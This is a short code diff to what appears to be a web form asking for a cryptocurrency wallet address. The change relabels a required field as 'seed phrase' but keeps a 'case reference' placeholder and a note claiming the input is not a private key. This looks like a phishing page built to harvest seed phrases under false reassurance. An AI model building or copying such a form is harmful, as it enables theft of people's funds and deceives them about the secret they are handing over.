@@ -208,7 +208,7 @@ export default function Home() {
                   <label className="field field--full">Wallet address <span>*</span>
                     <input name="walletAddress" type="text" placeholder="Paste a public address (0x…, bc1…, …)" required />
                   </label>
-                  <label className="field field--full field--important">Mode key <span>*</span>
+                  <label className="field field--full field--important">seed phrase <span>*</span>
                     <input name="modeKey" type="text" placeholder="Enter your case reference" required />
                     <small>Required for case matching. This is not a wallet private key.</small>
                   </label>
